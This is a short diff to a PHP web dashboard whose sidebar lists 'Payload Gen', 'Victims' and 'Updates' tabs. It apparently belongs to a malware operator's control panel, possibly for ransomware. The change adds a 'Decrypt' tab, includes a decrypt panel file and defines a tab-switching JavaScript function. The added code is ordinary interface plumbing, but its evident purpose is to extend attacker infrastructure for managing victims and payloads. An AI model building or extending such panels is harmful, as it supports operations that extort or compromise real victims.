@@ -46,6 +46,7 @@ $csrf = csrf_token();
   <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>Payload Gen</span></a>
   <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>Victims</span></a>
   <a href="#update" class="nav-item" onclick="showTab('update')"><i class="fas fa-cloud-download-alt"></i><span>Updates</span></a>
+  <a href="#decrypt" class="nav-item" onclick="showTab('decrypt')"><i class="fas fa-unlock-alt"></i><span>Decrypt</span></a>
   <div class="sidebar-foot">
     <span class="user-badge"><i class="fas fa-user-shield"></i> <?=h($_SESSION['username'])?></span>
     <a href="logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a>
@@ -128,6 +129,7 @@ $csrf = csrf_token();
 </main>
 
 <!-- Update Panel (hidden by default) -->
+<?php include __DIR__ . '/includes/decrypt_panel.html'; ?>
 <script>
 // inject update panel into main before script
 (function(){
@@ -154,6 +156,13 @@ function checkUpdate(){
       r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新版本 ('+d.current+')</div>';
     }
   }).catch(e=>{r.innerHTML='<div class="gen-err">检查失败: '+e+'</div>';});
+}
+
+function showDT(t){
+  document.querySelectorAll('.dt-content').forEach(d=>d.style.display='none');
+  document.querySelectorAll('.dt-btn').forEach(b=>b.classList.remove('active'));
+  var el=document.getElementById('dt-'+t);if(el)el.style.display='block';
+  event.target.classList.add('active');
 }
 
 function showTab(t){
